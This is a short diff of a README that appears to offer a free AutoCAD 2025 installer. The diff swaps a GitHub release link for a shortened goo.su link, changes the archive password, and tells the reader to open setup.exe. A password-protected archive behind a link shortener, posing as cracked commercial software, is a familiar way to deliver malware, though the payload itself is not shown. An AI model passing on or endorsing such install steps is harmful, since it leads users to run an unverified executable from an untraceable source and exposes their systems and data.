@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install:</H3>
 
-- [Download](https://github.com/valentimsantos22/auto-cad-2025/releases/download/Download/AutoCad2024.rar)
-- Open archive (password: cad2025)
+- [Download](https://goo.su/kuxfEs)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install autocad
 - Follow the instruction
 
